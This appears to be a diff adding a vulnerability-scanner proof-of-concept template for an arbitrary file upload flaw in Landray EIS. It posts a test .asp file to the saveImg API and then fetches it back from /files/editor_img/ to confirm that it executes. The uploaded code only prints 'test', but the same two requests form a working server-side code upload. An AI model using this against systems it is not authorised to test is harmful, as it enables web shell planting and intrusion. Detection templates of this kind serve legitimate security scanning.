@@ -1,0 +1,36 @@
+name: landray-eis-saveImg-upload
+set:
+  s0: randomInt(10000,99999)
+groups:
+  poc:  
+    - method: POST
+      path: /eis/service/api.aspx?action=saveImg
+      follow_redirects: false
+      headers:
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0eRg1ccWLR6yWQ5L  
+      body: |
+        ------WebKitFormBoundary0eRg1ccWLR6yWQ5L
+        Content-Disposition: form-data; name="file"; filename="{{s0}}.asp"
+        Content-Type: text/html
+        
+        <% response.write("test")%>
+        ------WebKitFormBoundary0eRg1ccWLR6yWQ5L
+      expression: >-
+        response.status == 200 && response.body.bcontains(b"asp")
+
+      search: '(?P<filename>\w+/\w+.asp)'
+
+    - method: GET
+      path: /files/editor_img/{{filename}}
+      follow_redirects: false 
+      expression: >-
+        response.status == 200 && response.body.bcontains(b"test")
+
+
+detail: 
+  links: 
+  authors:
+
